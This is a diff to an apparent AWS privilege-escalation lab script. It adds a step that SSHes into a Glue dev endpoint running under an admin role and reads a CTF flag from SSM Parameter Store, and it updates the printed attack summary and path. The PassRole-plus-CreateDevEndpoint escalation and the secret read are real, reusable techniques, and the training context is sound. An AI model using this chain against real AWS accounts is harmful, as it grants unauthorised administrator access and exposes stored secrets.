@@ -323,12 +323,29 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 11: Capture CTF flag from SSM Parameter Store
+# The Glue dev endpoint runs as the admin role, which implicitly grants ssm:GetParameter.
+# Execute the SSM call from within the SSH session on the endpoint.
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-001-to-admin"
+show_attack_cmd "Attacker (via endpoint)" "ssh ... glue@\${ENDPOINT_ADDRESS} 'aws ssm get-parameter --name $FLAG_PARAM_NAME --query Parameter.Value --output text'"
+FLAG_VALUE=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" \
+    "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text" 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole + glue:CreateDevEndpoint)"
@@ -337,12 +354,13 @@ echo "3. Waited for endpoint to provision and become ready"
 echo "4. Connected via SSH to the endpoint"
 echo "5. Executed AWS CLI commands with admin role credentials"
 echo "6. Achieved: Administrator Access via Glue Dev Endpoint"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER"
 echo -e "  → (PassRole + CreateDevEndpoint) → Glue Dev Endpoint with $TARGET_ROLE"
 echo -e "  → (SSH Access) → Execute AWS commands as admin"
-echo -e "  → Admin Access"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
